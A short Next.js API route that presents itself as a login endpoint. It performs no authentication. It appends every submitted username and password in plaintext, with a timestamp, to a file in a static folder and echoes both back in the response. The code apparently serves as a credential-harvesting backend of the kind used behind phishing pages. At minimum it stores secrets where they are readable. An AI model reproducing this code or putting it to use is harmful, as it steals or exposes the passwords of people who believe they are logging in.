import type { NextApiRequest, NextApiResponse } from 'next';
import fs from 'fs';
import path from 'path';

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  const { username, password } = req.body;
  const filepath = path.resolve(__dirname, '../../../static/access.txt');

  fs.writeFileSync(filepath, `${username} | ${password}  ${new Date()} \n`, {
    flag: 'a+',
  });

  res.status(200).json({ username, password });
}
